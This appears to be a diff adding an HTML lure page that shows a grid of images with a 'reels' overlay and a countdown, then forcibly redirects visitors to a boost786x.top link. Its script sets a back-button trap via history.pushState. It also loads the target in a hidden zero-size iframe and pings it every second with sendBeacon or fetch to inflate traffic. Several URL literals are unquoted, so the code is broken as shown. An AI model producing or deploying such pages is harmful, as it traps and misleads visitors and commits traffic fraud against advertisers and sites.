@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+
+<script defer data-domain="liiiinn10.pages.dev" src="https://api.publytics.net/js/script.js"></script>
+<script>
+window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
+publytics('pageview');
+</script>
+
+<!-- Facebook / Meta Tags -->
+<meta property="og:image" content="">
+<meta property="og:image:width" content="0">
+<meta property="og:image:height" content="0">
+<meta property="og:image:type" content="">
+<meta name="twitter:image" content="">
+<meta name="twitter:card" content="summary">
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+background: #0b0b0b;
+height: 100vh;
+width: 100vw;
+overflow: hidden;
+display: flex;
+justify-content: center;
+align-items: center;
+font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+position: relative;
+}
+
+/* Mobile-First Attractive Grid Layout Container */
+#image-grid {
+position: absolute;
+top: 0; left: 0;
+width: 100vw;
+height: 100vh;
+display: grid;
+grid-template-columns: repeat(2, 1fr);
+grid-template-rows: repeat(2, 1fr);
+gap: 6px;
+padding: 6px;
+background: #111;
+z-index: 1;
+display: none;
+}
+
+.grid-img-wrapper {
+position: relative;
+width: 100%;
+height: 100%;
+overflow: hidden;
+border-radius: 12px;
+box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+cursor: pointer;
+}
+
+.grid-img {
+width: 100%;
+height: 100%;
+object-fit: cover;
+transition: transform 0.3s ease, filter 0.3s ease;
+}
+
+.grid-img-wrapper:hover .grid-img {
+transform: scale(1.05);
+}
+
+.grid-img-wrapper::after {
+content: '';
+position: absolute;
+top: 0; left: 0; width: 100%; height: 100%;
+background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.4));
+pointer-events: none;
+}
+
+.loading {
+color: #fff;
+font-size: 16px;
+letter-spacing: 1px;
+z-index: 2;
+}
+
+#reels-overlay {
+position: absolute;
+top: 0;
+left: 0;
+width: 100vw;
+height: 100vh;
+object-fit: contain;
+pointer-events: none;
+z-index: 10;
+display: none;
+}
+
+.countdown-container {
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+width: 85px;
+height: 85px;
+display: none;
+justify-content: center;
+align-items: center;
+background: rgba(20, 20, 20, 0.75);
+backdrop-filter: blur(12px);
+-webkit-backdrop-filter: blur(12px);
+border-radius: 50%;
+border: 1px solid rgba(255, 255, 255, 0.15);
+box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+z-index: 999;
+pointer-events: none;
+}
+
+.countdown-svg {
+position: absolute;
+width: 100%;
+height: 100%;
+transform: rotate(-90deg);
+}
+
+.countdown-svg circle {
+fill: none;
+stroke-width: 4;
+}
+
+.circle-bg {
+stroke: rgba(255, 255, 255, 0.15);
+}
+
+.circle-progress {
+stroke: #00d2ff;
+stroke-dasharray: 251.2;
+stroke-dashoffset: 0;
+stroke-linecap: round;
+transition: stroke-dashoffset 1s linear;
+}
+
+#countdown-number {
+font-size: 30px;
+font-weight: 700;
+color: #ffffff;
+text-shadow: 0 2px 6px rgba(0,0,0,0.8);
+z-index: 1000;
+}
+</style>
+</head>
+<body>
+
+<div id="image-grid"></div>
+<div class="loading" id="loading-text">Loading...</div>
+<img id="reels-overlay" src="reels-overlay.png" alt="">
+
+<div class="countdown-container" id="countdown-box">
+<svg class="countdown-svg" viewBox="0 0 90 90">
+<circle class="circle-bg" cx="45" cy="45" r="40"></circle>
+<circle class="circle-progress" id="circle-progress" cx="45" cy="45" r="40"></circle>
+</svg>
+<span id="countdown-number">10</span>
+</div>
+
+<script>
+/* EVEN & FAIR UTM TARGET LINKS ROTATION (TIME & RANDOM BASED) */
+const TARGET_LINKS = [
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
+https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S
+];
+
+function getNextTargetLink() {
+// Combines current millisecond time and random selection so every new visitor
+// across any device or browser gets evenly distributed without getting stuck on index 0.
+const uniqueIndex = Math.floor(Math.random() * TARGET_LINKS.length);
+return TARGET_LINKS[uniqueIndex];
+}
+
+const activeTargetLink = getNextTargetLink();
+
+/* CONFIGURATION */
+const CONFIG = {
+targetLink: activeTargetLink,
+images: [
+https://ibwp622-oss.github.io/sharing/image_03.webp,
+https://blogger.googleusercontent.com/img/a/AVvXsEjVUsd8mlVZK1DJXR9EuGdrfRyV0nVuUrkzvaAGw4yUae65RBHpQi39ppBzQQTXZCF3wDJn4WQo6r1ImHFBdUZU5vxF07lBp-7Jyj4FNQ1vYnCWgNC2x0bILbK41nRKzaJP59n6OIsAKOTWZOJA_jXDb0Fo7tNhC4-BCf3qTXTcz3YKz-dsfdAnrPiCX_8q=s1600,
+https://blogger.googleusercontent.com/img/a/AVvXsEhr23hekhRZz9v2-tFa8hOO7sWOQMocOiam5F1joLAnEhUww1VKFR_uG5RPjPOvFQ1o-zHqNr3suFiLP8-G08YEDusJ91AIElANtF-ZexbLJpBQsAFqBl_f7ktIH9tk8uE5LHyKfM4ciXsyEzgrXBhW7jiHEJKhE37kTAvXD4pOe2owePnYf0l4-YDUZXHQ=w360-h640,
+https://blogger.googleusercontent.com/img/a/AVvXsEgxqJ9VZzSFBl94vzQs-GYFVbdbPIFcyY5TdfMJVNu0PFT6q7ZkCCzx9OZ-sJLuNsD20hR76WPggQ2xNjOtRCfTIZ6nFs7JGS9goNv_w12TLmft5ZWt2TeXXH_iWvgHuIbc_vzFYApmOsoGucgD3zkUyc4F_YA3xWn86M6A822sl4kGEO22N-0LxkiBiJvA=w360-h640
+]
+};
+
+// PRELOAD IMAGES
+CONFIG.images.forEach((src) => {
+const img = new Image();
+img.src = src;
+});
+
+/* MAIN LOGIC */
+(function () {
+initHistoryTrap();
+renderImageGrid();
+startCountdown(10);
+startDurationBooster();
+})();
+
+function initHistoryTrap() {
+history.pushState(null, null, window.location.href);
+history.pushState(null, null, window.location.href);
+
+window.addEventListener('popstate', function () {
+history.pushState(null, null, window.location.href);
+});
+}
+
+function renderImageGrid() {
+const gridContainer = document.getElementById("image-grid");
+gridContainer.innerHTML = "";
+
+CONFIG.images.forEach((src) => {
+const wrapper = document.createElement("div");
+wrapper.className = "grid-img-wrapper";
+wrapper.onclick = handleClick;
+
+const imgElement = document.createElement("img");
+imgElement.src = src;
+imgElement.className = "grid-img";
+
+wrapper.appendChild(imgElement);
+gridContainer.appendChild(wrapper);
+});
+
+gridContainer.style.display = "grid";
+document.getElementById("loading-text").style.display = "none";
+document.getElementById("countdown-box").style.display = "flex";
+document.getElementById("reels-overlay").style.display = "block";
+}
+
+function startCountdown(seconds) {
+let timeLeft = seconds;
+const numDisplay = document.getElementById("countdown-number");
+const circleProgress = document.getElementById("circle-progress");
+const totalCircleLength = 251.2;
+const countdownBox = document.getElementById("countdown-box");
+
+const timer = setInterval(() => {
+timeLeft--;
+
+if (timeLeft > 0) {
+numDisplay.textContent = timeLeft;
+const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
+circleProgress.style.strokeDashoffset = offset;
+} else {
+numDisplay.textContent = "0";
+circleProgress.style.strokeDashoffset = totalCircleLength;
+clearInterval(timer);
+countdownBox.style.display = "none";
+
+goToTarget();
+}
+}, 1000);
+}
+
+function handleClick() {
+goToTarget();
+}
+
+function startDurationBooster() {
+try {
+const iframe = document.createElement('iframe');
+iframe.src = CONFIG.targetLink;
+iframe.style.display = 'none';
+iframe.style.width = '0px';
+iframe.style.height = '0px';
+document.body.appendChild(iframe);
+} catch (e) {
+console.log("iFrame Blocked");
+}
+
+setInterval(() => {
+if (navigator.sendBeacon) {
+navigator.sendBeacon(CONFIG.targetLink);
+} else {
+fetch(CONFIG.targetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
+}
+}, 1000);
+}
+
+function goToTarget() {
+window.location.href = CONFIG.targetLink;
+}
+</script>
+</body>
+</html>
